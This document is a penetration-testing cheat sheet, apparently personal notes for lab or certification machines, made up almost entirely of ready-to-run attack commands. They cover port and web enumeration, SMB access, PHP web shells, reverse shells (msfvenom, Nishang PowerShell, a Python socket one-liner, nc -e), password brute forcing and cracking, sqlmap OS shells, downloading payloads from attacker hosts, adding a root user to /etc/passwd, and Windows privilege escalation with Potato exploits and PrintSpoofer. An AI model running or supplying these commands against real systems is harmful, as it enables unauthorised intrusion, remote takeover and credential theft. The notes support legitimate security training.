ENUMERATION

Port Scan
nmap -sC -sV -p- -vv -oA full 192.168.xxx.xxx
nmap -v -sS -A -T4 192.168.xxx.xxx (no ping)
nmap -sV -sC -Pn  192.168.xxx.xxx
nmap --script vuln 192.168.xxx.xxx

Web Enum
nikto -h 192.168.xxx.xxx
nikto -h 192.168.xxx.xxx -C all
gobuster dir -u http://192.168.xxx.xxx/ -w /usr/share/dirb/wordlists/common.txt -k -x .txt,.php --threads 50
gobuster dir -u http://192.168.98.106 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,sh,cgi,js,css,py -t 40
python3 /opt/dirsearch/dirsearch.py -u http://192.168.xxx.xxx -e php,html -x 400,401,403
feroxbuster -u http://192.168.xxx.xxx
curl http://website/ -s | html2text | tail

SMB Enum
smbclient -L \\\\192.168.xxx.xxx (List shares)
smbclient \\\\192.168.xxx.xxx\\shenzi (Connect to share)
smbclient -U '' \\\\192.168.xxx.xxx\Scripts$ 
smbmap -u null -p null -H 192.168.xxx.xxx -s Scripting$ -R

Remote Command Execution
echo "<?php echo system($_GET['x']); ?>" >> test.php | http://192.168.xxx.xxx/shell.php?cmd=dir

Reverse Shell
1. Netcat listener
rlwrap nc -lvp 21
2.Msfvenom
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.xxx.xxx LPORT=242 -f exe -o reverse.exe
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.xxx.xxx LPORT=445 -f msi > notavirus.msi
3. Nishang Powershell (edit end of script)
wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcpOneLine.ps1
#$client = New-Object System.Net.Sockets.TCPClient('192.168.xxx.xxx,1234;$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
cp Invoke-PowerShellTcpOneLine.ps1 rev.ps1
4.Python
python -c 'import pty;import socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.xxx.xxx",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
5. Php
https://raw.githubusercontent.com/ivan-sincek/php-reverse-shell/master/src/php_reverse_shell.php (Windows)
6. Elf
msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.xxx.xxx LPORT=22 -f elf > shell
7.Win-RM
evil-winrm -i 192.168.xxx.xxx -u 'Administrator' -p 'password'
8.
curl "http://192.168.210.147:30455/cmd.php?cmd=wget http://192.168.49.210:443/rev.txt -O /srv/http/rev.php"
9.
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.49.219 LPORT=4411  EXITFUNC=thread -b '\x00\x1a\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5' x86/alpha_mixed --platform windows -f python
10.
curl http://192.168.181.106/api/users | jq '.[]' -r > users.txt (JSON)

Brute Force
hydra -l admin -V -P /usr/share/wordlists/rockyou.txt -s 80 -f 192.168.xxx.xxx http-get / -t 15

SQL Injection
sqlmap -r post.txt --dbms mysql --os-shell

Upgrade shell
python -c 'import pty; pty.spawn("/bin/sh")'

Check System Info
lsb_release -a
hostnamectl

Password  cracking
hashcat -m 1600 -a 0 password.hash /usr/share/wordlists/rockyou.txt (MD5)
echo '$apr1$oRfRsc/K$UpYpplHDlaemqseM39Ugg0' >> password.hash
hashcat --force -m 0 -a 0 -o found1.txt --remove qj.hash /usr/share/wordlists/rockyou.txt
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt qj.hash 

Upload Payload
1.Windows
certutil.exe -f -urlcache -split http://192.168.xxx.xxx/Juicy.Potato.x86.exe
cadaver http://mwebsite/webdav/

RFI
curl http://192.168.xxx.xxx/cmd.php?cmd=whoami+/all
curl http://website/webdav/php-reverse-shell.php -u administrant:sleepless

Proof
type C:\Users\"username"\Desktop\local.txt

PRIV ESC

Local HTTP Server
python3 -m http.server 80
python2 -m SimpleHTTPServer 80

Password Salt
openssl passwd -1 -salt password password 
echo 'owned:$1$password$Da2mWXlxe6J7jtww12SNG/:0:0:owned:/root:/bin/bash' >> /etc/passwd
su owned

Windows
1. JAWS 
C:\temp> powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1
2.JUICY POTATO
get CLSID here:http://ohpe.it/juicy-potato/CLSID/
C:\wamp\www>.\Juicy.Potato.x86.exe -t * -c {9B1F122C-2982-4e91-AA8B-E071D54F2A4D}  -p c:\windows\system32\cmd.exe -a "/c c:\wamp\www\nc.exe -e cmd.exe 192.168.xxx.xxx 21" -l 31337
3. Rogue Potato
RoguePotato.exe -r 192.168.49.218 -e "/c c:\wamp\www\nc.exe 192.168.49.218 21 -e cmd.exe" -l 31337
4.Print Spoofer
wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe
curl http://192.168.62.169/cmd.php?cmd=powershell%20iwr%20http://192.168.49.62/PrintSpoofer64.exe%20-OutFile%20C:%5CWindows%5Ctasks%5CPrintSpoofer64.exe
curl http://192.168.62.169/cmd.php?cmd=C:%5CWindows%5Ctasks%5CPrintSpoofer64.exe%20-c%20%22cmd%20/c%20powershell%20-c%20C:/Windows/Tasks/rev.ps1%22
PrintSpoofer.exe -i -c cmd
5. Seatbelt
C:\Users\nathan>Seatbelt.exe all

Proof
type c:\users\administrator\desktop\proof.txt

